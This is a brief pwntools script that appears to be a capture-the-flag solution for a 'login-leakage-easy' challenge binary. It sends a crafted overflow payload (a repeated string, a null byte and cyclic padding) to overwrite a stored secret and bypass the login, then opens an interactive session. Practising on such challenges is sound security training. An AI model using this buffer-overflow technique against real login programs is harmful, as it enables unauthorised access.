#!/usr/bin/python3

from pwn import *
import time

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/login-leakage-easy')

input_start  = 0xe30
secret_addr = 0xe30 - 0xe11
overflow_size = input_start - secret_addr 

io = process()

payload = b"aaaaaaaa"+b"\x00"+cyclic(overflow_size - 9) + b"aaaaaaaa\x00"

io.sendline(str(len(payload)).encode())
time.sleep(1)
io.send(payload)

io.interactive()
